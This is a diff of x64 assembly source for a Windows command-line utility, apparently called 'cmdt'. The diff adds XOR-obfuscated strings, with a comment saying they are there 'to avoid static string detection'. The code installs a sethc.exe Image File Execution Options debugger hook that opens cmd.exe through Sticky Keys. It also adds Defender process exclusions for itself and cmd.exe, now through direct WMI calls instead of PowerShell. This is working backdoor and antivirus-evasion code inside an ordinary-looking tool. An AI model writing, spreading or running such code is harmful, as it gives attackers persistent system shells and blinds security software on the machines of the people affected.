@@ -37,8 +37,20 @@ EXTRN RegCloseKey:PROC
 EXTRN AttachConsole:PROC
 EXTRN GetStdHandle:PROC
 EXTRN WriteConsoleW:PROC
+EXTRN WriteConsoleInputW:PROC
 EXTRN WaitForSingleObject:PROC
 EXTRN CloseHandle:PROC
+EXTRN CoInitializeEx:PROC
+EXTRN CoInitializeSecurity:PROC
+EXTRN CoCreateInstance:PROC
+EXTRN CoSetProxyBlanket:PROC
+EXTRN SysAllocString:PROC
+EXTRN SysFreeString:PROC
+EXTRN VariantInit:PROC
+EXTRN VariantClear:PROC
+EXTRN SafeArrayCreate:PROC
+EXTRN SafeArrayPutElement:PROC
+EXTRN CoUninitialize:PROC
 
 ; ==============================================================================
 ; CONSTANT STRING DATA
@@ -47,10 +59,11 @@ EXTRN CloseHandle:PROC
 ; Registry key for storing application settings and MRU list
 str_regKey      dw 'S','o','f','t','w','a','r','e','\','c','m','d','t',0
 
-; Command-line switches for CLI mode
-str_cliSwitch1  dw '-','c','l','i',0           ; Short form with dash
-str_cliSwitch2  dw '-','-','c','l','i',0       ; Long form with double dash
-str_cliSwitch3  dw 'c','l','i',0               ; Bare form without dash
+; Command-line switch for CLI mode
+str_cliSwitch1  dw '-','c','l','i',0           ; CLI mode switch
+
+; Command-line switch for help/usage
+str_helpSwitch  dw '-','h','e','l','p',0        ; Display usage and exit
 
 ; Switch to request new console window
 str_newSwitch   dw '-','n','e','w',0
@@ -101,27 +114,56 @@ str_cmdQuote        dw '"',0
 str_cmdSuffixDir    dw '"',' ','-','c','l','i',' ','-','n','e','w',' ','c','m','d','.','e','x','e',' ','/','k',' ','c','d',' ','/','d',' ','"','%','V','"',0
 str_cmdSuffixFile   dw '"',' ','"','%','1','"',0
 
-; IFEO registry path and values for sethc.exe hook
-str_ifeoKey         dw 'S','O','F','T','W','A','R','E','\'
-                    dw 'M','i','c','r','o','s','o','f','t','\'
-                    dw 'W','i','n','d','o','w','s',' ','N','T','\'
-                    dw 'C','u','r','r','e','n','t','V','e','r','s','i','o','n','\'
-                    dw 'I','m','a','g','e',' ','F','i','l','e',' '
-                    dw 'E','x','e','c','u','t','i','o','n',' '
-                    dw 'O','p','t','i','o','n','s','\'
-                    dw 's','e','t','h','c','.','e','x','e',0
-str_debuggerVal     dw 'D','e','b','u','g','g','e','r',0
+; ==============================================================================
+; OBFUSCATED STRINGS - XOR encrypted with key 0x0aah
+; These strings are decrypted at runtime to avoid static string detection
+; ==============================================================================
+
+; IFEO registry path and values for sethc.exe hook (encrypted)
+str_ifeoKey_enc     db 0f9h,0aah,0e5h,0aah,0ech,0aah,0feh,0aah,0fdh,0aah,0ebh,0aah,0f8h,0aah,0efh,0aah
+                    db 0f6h,0aah,0e7h,0aah,0c3h,0aah,0c9h,0aah,0d8h,0aah,0c5h,0aah,0d9h,0aah,0c5h,0aah
+                    db 0cch,0aah,0deh,0aah,0f6h,0aah,0fdh,0aah,0c3h,0aah,0c4h,0aah,0ceh,0aah,0c5h,0aah
+                    db 0ddh,0aah,0d9h,0aah,08ah,0aah,0e4h,0aah,0feh,0aah,0f6h,0aah,0e9h,0aah,0dfh,0aah
+                    db 0d8h,0aah,0d8h,0aah,0cfh,0aah,0c4h,0aah,0deh,0aah,0fch,0aah,0cfh,0aah,0d8h,0aah
+                    db 0d9h,0aah,0c3h,0aah,0c5h,0aah,0c4h,0aah,0f6h,0aah,0e3h,0aah,0c7h,0aah,0cbh,0aah
+                    db 0cdh,0aah,0cfh,0aah,08ah,0aah,0ech,0aah,0c3h,0aah,0c6h,0aah,0cfh,0aah,08ah,0aah
+                    db 0efh,0aah,0d2h,0aah,0cfh,0aah,0c9h,0aah,0dfh,0aah,0deh,0aah,0c3h,0aah,0c5h,0aah
+                    db 0c4h,0aah,08ah,0aah,0e5h,0aah,0dah,0aah,0deh,0aah,0c3h,0aah,0c5h,0aah,0c4h,0aah
+                    db 0d9h,0aah,0f6h,0aah,0d9h,0aah,0cfh,0aah,0deh,0aah,0c2h,0aah,0c9h,0aah,084h,0aah
+                    db 0cfh,0aah,0d2h,0aah,0cfh,0aah,0aah,0aah
+
+str_debuggerVal_enc db 0eeh,0aah,0cfh,0aah,0c8h,0aah,0dfh,0aah,0cdh,0aah,0cdh,0aah,0cfh,0aah,0d8h,0aah
+                    db 0aah,0aah
+
 str_shiftSuffix     dw ' ','-','c','l','i',' ','-','n','e','w',' ','c','m','d','.','e','x','e',0
 
-; PowerShell executable and Defender exclusion command fragments (dynamic)
-str_powershell      dw 'p','o','w','e','r','s','h','e','l','l','.','e','x','e',0
-str_psAddPfx        dw '-','N','o','P','r','o','f','i','l','e',' ','-','c',' '
-                    dw '"','A','d','d','-','M','p','P','r','e','f','e','r','e','n','c','e',' '
-                    dw '-','E','x','c','l','u','s','i','o','n','P','r','o','c','e','s','s',' ',0
-str_psRemPfx        dw '-','N','o','P','r','o','f','i','l','e',' ','-','c',' '
-                    dw '"','R','e','m','o','v','e','-','M','p','P','r','e','f','e','r','e','n','c','e',' '
-                    dw '-','E','x','c','l','u','s','i','o','n','P','r','o','c','e','s','s',' ',0
-str_psSuffix        dw ',','c','m','d','.','e','x','e',' ','-','F','o','r','c','e','"',0
+; ==============================================================================
+; WMI COM GUIDs
+; ==============================================================================
+CLSID_WbemLocator db 011h,0F8h,090h,045h,03Ah,01Dh,0D0h,011h,089h,01Fh,000h,0AAh,000h,04Bh,02Eh,024h
+IID_IWbemLocator  db 087h,0A6h,012h,0DCh,07Fh,073h,0CFh,011h,088h,04Dh,000h,0AAh,000h,04Bh,02Eh,024h
+
+; ==============================================================================
+; WMI AND DEFENDER STRINGS - XOR encrypted with key 0x0aah
+; ==============================================================================
+str_wmi_namespace db 0f8h,0aah,0e5h,0aah,0e5h,0aah,0feh,0aah,0f6h,0aah,0e7h,0aah,0c3h,0aah,0c9h,0aah
+                  db 0d8h,0aah,0c5h,0aah,0d9h,0aah,0c5h,0aah,0cch,0aah,0deh,0aah,0f6h,0aah,0fdh,0aah
+                  db 0c3h,0aah,0c4h,0aah,0ceh,0aah,0c5h,0aah,0ddh,0aah,0d9h,0aah,0f6h,0aah,0eeh,0aah
+                  db 0cfh,0aah,0cch,0aah,0cfh,0aah,0c4h,0aah,0ceh,0aah,0cfh,0aah,0d8h,0aah,0aah,0aah
+
+str_wmi_class     db 0e7h,0aah,0f9h,0aah,0ech,0aah,0feh,0aah,0f5h,0aah,0e7h,0aah,0dah,0aah,0fah,0aah
+                  db 0d8h,0aah,0cfh,0aah,0cch,0aah,0cfh,0aah,0d8h,0aah,0cfh,0aah,0c4h,0aah,0c9h,0aah
+                  db 0cfh,0aah,0aah,0aah
+
+str_wmi_add       db 0ebh,0aah,0ceh,0aah,0ceh,0aah,0aah,0aah
+
+str_wmi_rem       db 0f8h,0aah,0cfh,0aah,0c7h,0aah,0c5h,0aah,0dch,0aah,0cfh,0aah,0aah,0aah
+
+str_wmi_prop      db 0efh,0aah,0d2h,0aah,0c9h,0aah,0c6h,0aah,0dfh,0aah,0d9h,0aah,0c3h,0aah,0c5h,0aah
+                  db 0c4h,0aah,0fah,0aah,0d8h,0aah,0c5h,0aah,0c9h,0aah,0cfh,0aah,0d9h,0aah,0d9h,0aah
+                  db 0aah,0aah
+
+str_cmd_exe       db 0c9h,0aah,0c7h,0aah,0ceh,0aah,084h,0aah,0cfh,0aah,0d2h,0aah,0cfh,0aah,0aah,0aah
 
 ; Usage help text displayed when an unknown switch is given
 str_usage       dw 13,10
@@ -145,6 +187,9 @@ str_usage       dw 13,10
                 dw ' ',' ','-','u','n','s','h','i','f','t'
                 dw ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' '
                 dw 'U','n','h','o','o','k',' ','s','e','t','h','c','.','e','x','e',13,10
+                dw ' ',' ','-','h','e','l','p'
+                dw ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' '
+                dw 'S','h','o','w',' ','t','h','i','s',' ','h','e','l','p',13,10
                 dw 13,10
                 dw ' ',' ','N','o',' ','a','r','g','s',' ','t','o',' ','s','t','a','r','t',' ','G','U','I','.',13,10
                 dw 0
@@ -242,7 +287,7 @@ g_hInstance     dq 0
 .data?
 
 ; Export buffer declarations for use by other modules
-PUBLIC g_cmdBuf, g_statusBuf, g_filePath, g_argsBuf, g_tempBuf
+PUBLIC g_cmdBuf, g_statusBuf, g_filePath, g_argsBuf, g_tempBuf, g_exePath, g_decryptBuf
 
 ; Buffer for command line text (520 WCHARs = 1040 bytes)
 g_cmdBuf        dw 520 dup(?)
@@ -262,10 +307,67 @@ g_tempBuf       dw 1040 dup(?)
 ; Buffer for exe path (UAC elevation and context menu registration)
 g_exePath       dw 260 dup(?)
 
+; Buffer for decrypted strings (reusable, 520 WCHARs)
+g_decryptBuf    dw 520 dup(?)
+
 ; ==============================================================================
 ; CODE SECTION
 ; ==============================================================================
 .code
+
+; ==============================================================================
+; DecryptWideStr - XOR Decrypt Wide String In-Place
+;
+; Purpose: Decrypts a XOR-encrypted wide character string into destination buffer
+;          Uses simple XOR with single-byte key applied to each byte
+;
+; Parameters:
+;   RCX = Pointer to encrypted source string
+;   RDX = Pointer to destination buffer
+;
+; Returns:
+;   RAX = Pointer to destination buffer (same as RDX input)
+;
+; Modifies: RAX, RSI, RDI
+;
+; Notes:
+;   - XOR key is hardcoded as 0x0aah
+;   - Decryption stops at null terminator (0x0000)
+;   - Each byte of the wide string is XORed independently
+; ==============================================================================
+DecryptWideStr proc
+    push rsi
+    push rdi
+    
+    mov rsi, rcx                ; RSI = source (encrypted)
+    mov rdi, rdx                ; RDI = destination
+    
+dws_loop:
+    ; Decrypt first byte of wide char
+    mov al, byte ptr [rsi]
+    xor al, 0aah                ; XOR with key
+    mov byte ptr [rdi], al
+    
+    ; Decrypt second byte of wide char
+    mov al, byte ptr [rsi+1]
+    xor al, 0aah                ; XOR with key
+    mov byte ptr [rdi+1], al
+    
+    ; Check if we hit null terminator
+    cmp word ptr [rdi], 0
+    je dws_done
+    
+    ; Move to next character
+    add rsi, 2
+    add rdi, 2
+    jmp dws_loop
+    
+dws_done:
+    mov rax, rdx                ; Return destination pointer
+    pop rdi
+    pop rsi
+    ret
+DecryptWideStr endp
 
 ; ==============================================================================
 ; wcscpy_p - Wide Character String Copy (Private Implementation)
@@ -430,18 +532,18 @@ skip_spaces endp
 ; Returns:
 ;   RAX = Number of wide characters (excluding null terminator)
 ;
-; Modifies: RAX, R8
+; Modifies: RAX
 ; ==============================================================================
 wcslen_p proc
     mov rax, rcx                ; RAX = string pointer
-    xor r8, r8                  ; R8 = character count
 @@:
-    cmp word ptr [rax + r8*2], 0 ; Check for null terminator
-    je @F                       ; Exit if found
-    inc r8                      ; Increment count
+    cmp word ptr [rax], 0       ; Check for null terminator
+    jz @F                       ; Exit if found
+    add rax, 2                  ; Advance pointer
     jmp @B                      ; Continue counting
 @@:
-    mov rax, r8                 ; Return count in RAX
+    sub rax, rcx                ; Calculate byte difference
+    sar rax, 1                  ; Divide by 2 to get character count
     ret
 wcslen_p endp
 
@@ -591,20 +693,6 @@ uac_already_admin:
     test rax, rax
     jnz mode_cli_found
 
-    ; Check if argv[1] matches "--cli"
-    lea rdx, str_cliSwitch2
-    mov rcx, r14
-    call wcscmp_ci
-    test rax, rax
-    jnz mode_cli_found
-
-    ; Check if argv[1] matches "cli"
-    lea rdx, str_cliSwitch3
-    mov rcx, r14
-    call wcscmp_ci
-    test rax, rax
-    jnz mode_cli_found
-
     ; Check if argv[1] matches "-install"
     lea rdx, str_installSwitch
     mov rcx, r14
@@ -632,6 +720,13 @@ uac_already_admin:
     call wcscmp_ci
     test rax, rax
     jnz mode_unshift_found
+
+    ; Check if argv[1] matches "-help"
+    lea rdx, str_helpSwitch
+    mov rcx, r14
+    call wcscmp_ci
+    test rax, rax
+    jnz show_usage
 
     ; No recognized switch: check if argv[1] starts with '-'
     cmp word ptr [r14], '-'
@@ -884,7 +979,7 @@ show_usage:
     add rsp, 32
 
     ; Attach to parent console (ATTACH_PARENT_PROCESS)
-    mov ecx, 0FFFFFFFFh
+    mov ecx, ATTACH_PARENT_PROCESS
     sub rsp, 32
     call AttachConsole
     add rsp, 32
@@ -892,7 +987,7 @@ show_usage:
     jz show_usage_exit
 
     ; Get stdout handle (STD_OUTPUT_HANDLE)
-    mov ecx, 0FFFFFFF5h
+    mov ecx, STD_OUTPUT_HANDLE
     sub rsp, 32
     call GetStdHandle
     add rsp, 32
@@ -911,6 +1006,35 @@ show_usage:
     mov rcx, rbx               ; hConsoleOutput
     call WriteConsoleW
     add rsp, 48
+
+    ; Inject Enter key into console input so cmd.exe redraws prompt immediately
+    ; (AttachConsole causes cmd.exe to show its prompt before our output appears,
+    ;  so after we exit the cursor blinks waiting for input - sending Enter fixes it)
+    mov ecx, STD_INPUT_HANDLE
+    sub rsp, 32
+    call GetStdHandle
+    add rsp, 32
+    test rax, rax
+    jz show_usage_exit
+    mov rdi, rax                ; RDI = stdin handle
+
+    ; Build INPUT_RECORD at [rbp-96] (20 bytes, safe in local frame)
+    mov word ptr [rbp-96], 1    ; EventType = KEY_EVENT
+    mov word ptr [rbp-94], 0    ; padding
+    mov dword ptr [rbp-92], 1   ; bKeyDown = TRUE
+    mov word ptr [rbp-88], 1    ; wRepeatCount = 1
+    mov word ptr [rbp-86], 0Dh  ; wVirtualKeyCode = VK_RETURN
+    mov word ptr [rbp-84], 1Ch  ; wVirtualScanCode
+    mov word ptr [rbp-82], 0Dh  ; uChar.UnicodeChar = '\r'
+    mov dword ptr [rbp-80], 0   ; dwControlKeyState = 0
+
+    sub rsp, 32
+    lea r9, [rbp-64]            ; lpNumberOfEventsWritten
+    mov r8d, 1                  ; nLength = 1
+    lea rdx, [rbp-96]           ; lpBuffer = &inputRecord
+    mov rcx, rdi                ; hConsoleInput
+    call WriteConsoleInputW
+    add rsp, 32
 
 show_usage_exit:
     mov ecx, 1
@@ -1870,21 +1994,24 @@ InstallShift proc
     call GetExeFileName
     mov r12, rax
 
-    ; Build PS add exclusion command in g_cmdBuf:
-    ; -NoProfile -c "Add-MpPreference -ExclusionProcess <filename>,cmd.exe -Force"
-    lea rcx, g_cmdBuf
-    lea rdx, str_psAddPfx
-    call wcscpy_p
-    lea rcx, g_cmdBuf
-    mov rdx, r12
-    call wcscat_p
-    lea rcx, g_cmdBuf
-    lea rdx, str_psSuffix
-    call wcscat_p
+    ; Decrypt 'Add' method name for WMI
+    lea rcx, str_wmi_add
+    lea rdx, g_tempBuf
+    call DecryptWideStr
 
-    ; Add Defender process exclusions
-    lea rcx, g_cmdBuf
-    call RunPsCommand
+    ; Add CMDT executable to exclusions
+    mov rcx, r12
+    lea rdx, g_tempBuf
+    call ManageDefenderExclusion
+
+    ; Add cmd.exe to exclusions
+    lea rcx, str_cmd_exe
+    lea rdx, g_decryptBuf
+    call DecryptWideStr
+
+    lea rcx, g_decryptBuf
+    lea rdx, g_tempBuf          ; method name is still in g_tempBuf
+    call ManageDefenderExclusion
 
     ; Build IFEO debugger value in g_tempBuf: <full_path> -cli -new cmd.exe
     lea rcx, g_tempBuf
@@ -1900,6 +2027,11 @@ InstallShift proc
     lea rbx, [rax+1]
     shl rbx, 1
 
+    ; Decrypt IFEO registry key path
+    lea rcx, str_ifeoKey_enc
+    lea rdx, g_decryptBuf
+    call DecryptWideStr
+
     ; Create/open IFEO sethc.exe key under HKLM
     lea rax, [rsp+80]
     mov qword ptr [rsp+64], rax     ; lpdwDisposition
@@ -1910,7 +2042,7 @@ InstallShift proc
     mov qword ptr [rsp+32], 0       ; dwOptions
     xor r9, r9                      ; lpClass
     xor r8d, r8d                    ; Reserved
-    lea rdx, str_ifeoKey
+    lea rdx, g_decryptBuf
     mov ecx, HKEY_LOCAL_MACHINE
     call RegCreateKeyExW
     test eax, eax
@@ -1922,7 +2054,13 @@ InstallShift proc
     mov qword ptr [rsp+32], rax     ; lpData
     mov r9d, REG_SZ                 ; dwType
     xor r8d, r8d                    ; Reserved
-    lea rdx, str_debuggerVal        ; lpValueName = "Debugger"
+    
+    ; Decrypt Debugger value name
+    lea rcx, str_debuggerVal_enc
+    lea rdx, g_filePath
+    call DecryptWideStr
+    
+    lea rdx, g_filePath             ; lpValueName = "Debugger"
     mov rcx, [rsp+72]              ; hKey
     call RegSetValueExW
 
@@ -1955,19 +2093,29 @@ UninstallShift proc
     sub rsp, 48
     ; [rsp+40] = hKey
 
+    ; Decrypt IFEO registry key path
+    lea rcx, str_ifeoKey_enc
+    lea rdx, g_decryptBuf
+    call DecryptWideStr
+
     ; Open IFEO sethc.exe key
     lea rax, [rsp+40]
     mov qword ptr [rsp+32], rax     ; phkResult = &hKey
     mov r9d, KEY_WRITE              ; samDesired
     xor r8d, r8d                    ; ulOptions
-    lea rdx, str_ifeoKey            ; lpSubKey
+    lea rdx, g_decryptBuf           ; lpSubKey
     mov ecx, HKEY_LOCAL_MACHINE     ; hKey
     call RegOpenKeyExW
     test eax, eax
     jnz unshift_ps                  ; Key doesn't exist, skip to PS cleanup
 
+    ; Decrypt Debugger value name
+    lea rcx, str_debuggerVal_enc
+    lea rdx, g_filePath
+    call DecryptWideStr
+
     ; Delete only the Debugger value
-    lea rdx, str_debuggerVal
+    lea rdx, g_filePath
     mov rcx, [rsp+40]
     call RegDeleteValueW
 
@@ -1986,21 +2134,24 @@ unshift_ps:
     call GetExeFileName
     mov r12, rax
 
-    ; Build PS remove exclusion command in g_cmdBuf:
-    ; -NoProfile -c "Remove-MpPreference -ExclusionProcess <filename>,cmd.exe -Force"
-    lea rcx, g_cmdBuf
-    lea rdx, str_psRemPfx
-    call wcscpy_p
-    lea rcx, g_cmdBuf
-    mov rdx, r12
-    call wcscat_p
-    lea rcx, g_cmdBuf
-    lea rdx, str_psSuffix
-    call wcscat_p
+    ; Decrypt 'Remove' method name for WMI
+    lea rcx, str_wmi_rem
+    lea rdx, g_tempBuf
+    call DecryptWideStr
 
-    ; Remove Defender process exclusions
-    lea rcx, g_cmdBuf
-    call RunPsCommand
+    ; Remove CMDT executable from exclusions
+    mov rcx, r12
+    lea rdx, g_tempBuf
+    call ManageDefenderExclusion
+
+    ; Remove cmd.exe from exclusions
+    lea rcx, str_cmd_exe
+    lea rdx, g_decryptBuf
+    call DecryptWideStr
+
+    lea rcx, g_decryptBuf
+    lea rdx, g_tempBuf          ; method name is still in g_tempBuf
+    call ManageDefenderExclusion
 
     add rsp, 48
     pop r12
@@ -2008,67 +2159,290 @@ unshift_ps:
 UninstallShift endp
 
 ; ==============================================================================
-; RunPsCommand - Execute a PowerShell command and wait for completion
+; ManageDefenderExclusion - Adds or removes a process exclusion in MS Defender
 ;
-; Purpose: Runs powershell.exe with given parameters using ShellExecuteExW
-;          with SW_HIDE, waits for the process to finish, then cleans up.
+; Purpose: Replaces RunPsCommand by directly interacting with the WMI interface.
 ;
 ; Parameters:
-;   RCX = Pointer to wide string with PowerShell parameters
-;
-; Returns: None
-;
-; Stack frame: 152 bytes (32 shadow + 112 SHELLEXECUTEINFOW + 8 pad)
+;   RCX = Pointer to the executable name (wide string) to exclude
+;   RDX = Pointer to the method name (wide string, "Add" or "Remove")
 ; ==============================================================================
-RunPsCommand proc
+ManageDefenderExclusion proc frame
+    push rbp
+    .pushreg rbp
+    mov rbp, rsp
+    .setframe rbp, 0
     push rbx
-    push rdi
-    sub rsp, 152
-    ; [rsp+0..31] = shadow space
-    ; [rsp+32..143] = SHELLEXECUTEINFOW (112 bytes)
+    .pushreg rbx
+    push r12
+    .pushreg r12
+    push r13
+    .pushreg r13
+    push r14
+    .pushreg r14
+    push r15
+    .pushreg r15
+    sub rsp, 248                ; 248 maintains 16-byte alignment
+    .allocstack 248
+    .endprolog
 
-    mov rbx, rcx                ; RBX = lpParameters
+    mov r12, rcx                ; r12 = pszProcessName
+    mov r13, rdx                ; r13 = pszMethodName
 
-    ; Zero SHELLEXECUTEINFOW
-    lea rdi, [rsp+32]
-    xor rax, rax
-    mov rcx, 14                 ; 112 / 8 = 14 qwords
-@@:
-    mov qword ptr [rdi], rax
-    add rdi, 8
-    dec rcx
-    jnz @B
+    ; Zero initialize COM pointers
+    mov qword ptr [rbp-40], 0   ; pLoc
+    mov qword ptr [rbp-48], 0   ; pSvc
+    mov qword ptr [rbp-56], 0   ; pClass
+    mov qword ptr [rbp-64], 0   ; pInParamsDef
+    mov qword ptr [rbp-72], 0   ; pClassInstance
 
-    ; Fill SHELLEXECUTEINFOW fields
-    mov dword ptr [rsp+32], 112             ; cbSize
-    mov dword ptr [rsp+36], 00000040h       ; fMask = SEE_MASK_NOCLOSEPROCESS
-    lea rax, str_powershell
-    mov qword ptr [rsp+56], rax             ; lpFile = "powershell.exe"
-    mov qword ptr [rsp+64], rbx             ; lpParameters
-    mov dword ptr [rsp+80], SW_HIDE         ; nShow = 0
+    ; CoInitializeEx(NULL, COINIT_MULTITHREADED)
+    xor ecx, ecx
+    xor edx, edx
+    call CoInitializeEx
 
-    ; Launch PowerShell
-    lea rcx, [rsp+32]
-    call ShellExecuteExW
+    ; CoInitializeSecurity
+    xor ecx, ecx
+    mov edx, -1
+    xor r8d, r8d
+    xor r9d, r9d
+    mov qword ptr [rsp+32], 0
+    mov qword ptr [rsp+40], 3   ; RPC_C_IMP_LEVEL_IMPERSONATE
+    mov qword ptr [rsp+48], 0
+    mov dword ptr [rsp+56], 0
+    mov qword ptr [rsp+64], 0
+    call CoInitializeSecurity
+    cmp eax, 80010119h          ; RPC_E_TOO_LATE
+    je init_sec_ok
     test eax, eax
-    jz ps_done
+    jl wmi_cleanup
+init_sec_ok:
+    ; COM security already initialized, proceed with WMI connection
 
-    ; Wait for PowerShell to complete
-    mov rcx, qword ptr [rsp+136]            ; hProcess (offset 104 from struct start = 32+104=136)
+    ; CoCreateInstance(CLSID_WbemLocator)
+    lea rcx, CLSID_WbemLocator
+    xor edx, edx
+    mov r8d, 1                  ; CLSCTX_INPROC_SERVER
+    lea r9, IID_IWbemLocator
+    lea rax, [rbp-40]
+    mov qword ptr [rsp+32], rax
+    call CoCreateInstance
+    test eax, eax
+    jl wmi_cleanup              ; FAILED(hr)
+
+    ; pLoc->ConnectServer("ROOT\Microsoft\Windows\Defender")
+    lea rcx, str_wmi_namespace
+    lea rdx, g_decryptBuf
+    call DecryptWideStr
+    lea rcx, g_decryptBuf
+    call SysAllocString
+    mov rbx, rax                ; rbx = bstrNamespace
+
+    mov rcx, [rbp-40]           ; pLoc
+    mov rdx, rbx                ; strNetworkResource
+    xor r8d, r8d                ; strUser
+    xor r9d, r9d                ; strPassword
+    mov qword ptr [rsp+32], 0   ; strLocale
+    mov qword ptr [rsp+40], 0   ; lSecurityFlags
+    mov qword ptr [rsp+48], 0   ; strAuthority
+    mov qword ptr [rsp+56], 0   ; pCtx
+    lea rax, [rbp-48]
+    mov qword ptr [rsp+64], rax ; ppNamespace
+    mov rax, [rcx]              ; pLoc vtable
+    call qword ptr [rax+24]     ; ConnectServer (index 3)
+
+    mov rcx, rbx
+    mov r14d, eax               ; save hr
+    call SysFreeString
+    test r14d, r14d
+    jl wmi_cleanup
+
+    ; CoSetProxyBlanket
+    mov rcx, [rbp-48]           ; pSvc
+    mov edx, 10                 ; RPC_C_AUTHN_WINNT
+    xor r8d, r8d                ; RPC_C_AUTHZ_NONE
+    xor r9d, r9d                ; pServerPrincName
+    mov qword ptr [rsp+32], 3   ; RPC_C_AUTHN_LEVEL_CALL
+    mov qword ptr [rsp+40], 3   ; RPC_C_IMP_LEVEL_IMPERSONATE
+    mov qword ptr [rsp+48], 0   ; pAuthInfo
+    mov dword ptr [rsp+56], 0   ; EOAC_NONE
+    call CoSetProxyBlanket
+
+    ; GetObject("MSFT_MpPreference")
+    lea rcx, str_wmi_class
+    lea rdx, g_decryptBuf
+    call DecryptWideStr
+    lea rcx, g_decryptBuf
+    call SysAllocString
+    mov rbx, rax
+
+    mov rcx, [rbp-48]           ; pSvc
+    mov rdx, rbx                ; strObjectPath
+    xor r8d, r8d                ; lFlags
+    xor r9d, r9d                ; pCtx
+    lea rax, [rbp-56]
+    mov qword ptr [rsp+32], rax ; ppObject
+    mov qword ptr [rsp+40], 0   ; ppCallResult
+    mov rax, [rcx]
+    call qword ptr [rax+48]     ; GetObject (index 6)
+
+    mov rcx, rbx
+    mov r14d, eax
+    call SysFreeString
+    test r14d, r14d
+    jl wmi_cleanup
+
+    ; GetMethod(pszMethodName)
+    mov rcx, r13                ; method name is already unencrypted
+    call SysAllocString
+    mov rbx, rax
+
+    mov rcx, [rbp-56]           ; pClass
+    mov rdx, rbx                ; strName
+    xor r8d, r8d                ; lFlags
+    lea r9, [rbp-64]            ; ppInSignature
+    mov qword ptr [rsp+32], 0   ; ppOutSignature
+    mov rax, [rcx]
+    call qword ptr [rax+152]    ; GetMethod (index 19)
+
+    mov rcx, rbx
+    mov r14d, eax
+    call SysFreeString
+    test r14d, r14d
+    jl wmi_cleanup
+
+    ; SpawnInstance
+    mov rcx, [rbp-64]           ; pInParamsDef
+    xor edx, edx                ; lFlags
+    lea r8, [rbp-72]            ; ppNewInstance
+    mov rax, [rcx]
+    call qword ptr [rax+120]    ; SpawnInstance (index 15)
+    test eax, eax
+    jl wmi_cleanup
+
+    ; Prepare SAFEARRAY for Variant
+    lea rcx, [rbp-104]          ; VARIANT var
+    call VariantInit
+
+    ; Create SAFEARRAY
+    mov dword ptr [rbp-120], 1  ; bounds.cElements = 1
+    mov dword ptr [rbp-116], 0  ; bounds.lLbound = 0
+    mov ecx, 8                  ; VT_BSTR
+    mov edx, 1                  ; cDims
+    lea r8, [rbp-120]           ; rgsabound
+    call SafeArrayCreate
+    mov r15, rax                ; r15 = parray
+
+    ; Put element in SAFEARRAY
+    mov dword ptr [rbp-128], 0  ; ix[0] = 0
+    mov rcx, r12                ; pszProcessName
+    call SysAllocString
+    mov rbx, rax                ; BSTR val
+
+    mov rcx, r15                ; parray
+    lea rdx, [rbp-128]          ; rgIndices
+    mov r8, rbx                 ; pv
+    call SafeArrayPutElement
+
+    mov rcx, rbx
+    call SysFreeString
+
+    ; Set up VARIANT
+    mov word ptr [rbp-104], 2008h ; VT_ARRAY | VT_BSTR
+    mov qword ptr [rbp-96], r15   ; var.parray = parray
+
+    ; Put property
+    lea rcx, str_wmi_prop
+    lea rdx, g_decryptBuf
+    call DecryptWideStr
+    lea rcx, g_decryptBuf
+    call SysAllocString
+    mov rbx, rax
+
+    mov rcx, [rbp-72]           ; pClassInstance
+    mov rdx, rbx                ; strName
+    xor r8d, r8d                ; lFlags
+    lea r9, [rbp-104]           ; pVal = &var
+    mov qword ptr [rsp+32], 0   ; Type
+    mov rax, [rcx]
+    call qword ptr [rax+40]     ; Put (index 5)
+
+    mov rcx, rbx
+    call SysFreeString
+
+    lea rcx, [rbp-104]
+    call VariantClear
+
+    ; ExecMethod
+    lea rcx, str_wmi_class
+    lea rdx, g_decryptBuf
+    call DecryptWideStr
+    lea rcx, g_decryptBuf
+    call SysAllocString
+    mov r14, rax                ; strObjectPath
+
+    mov rcx, r13
+    call SysAllocString
+    mov rbx, rax                ; strMethodName
+
+    mov rcx, [rbp-48]           ; pSvc
+    mov rdx, r14                ; strObjectPath
+    mov r8, rbx                 ; strMethodName
+    xor r9d, r9d                ; lFlags
+    mov qword ptr [rsp+32], 0   ; pCtx
+    mov rax, [rbp-72]
+    mov qword ptr [rsp+40], rax ; pInParams
+    mov qword ptr [rsp+48], 0   ; ppOutParams
+    mov qword ptr [rsp+56], 0   ; ppCallResult
+    mov rax, [rcx]
+    call qword ptr [rax+192]    ; ExecMethod (index 24)
+
+    mov rcx, r14
+    call SysFreeString
+    mov rcx, rbx
+    call SysFreeString
+
+wmi_cleanup:
+    mov rcx, [rbp-72]
     test rcx, rcx
-    jz ps_done
-    mov edx, 0FFFFFFFFh                     ; INFINITE
-    call WaitForSingleObject
+    jz @F
+    mov rax, [rcx]
+    call qword ptr [rax+16]     ; Release (index 2)
+@@:
+    mov rcx, [rbp-64]
+    test rcx, rcx
+    jz @F
+    mov rax, [rcx]
+    call qword ptr [rax+16]
+@@:
+    mov rcx, [rbp-56]
+    test rcx, rcx
+    jz @F
+    mov rax, [rcx]
+    call qword ptr [rax+16]
+@@:
+    mov rcx, [rbp-48]
+    test rcx, rcx
+    jz @F
+    mov rax, [rcx]
+    call qword ptr [rax+16]
+@@:
+    mov rcx, [rbp-40]
+    test rcx, rcx
+    jz @F
+    mov rax, [rcx]
+    call qword ptr [rax+16]
+@@:
+    call CoUninitialize
 
-    ; Close process handle
-    mov rcx, qword ptr [rsp+136]
-    call CloseHandle
-
-ps_done:
-    add rsp, 152
-    pop rdi
+    add rsp, 248
+    pop r15
+    pop r14
+    pop r13
+    pop r12
     pop rbx
+    pop rbp
     ret
-RunPsCommand endp
+ManageDefenderExclusion endp
 
 end
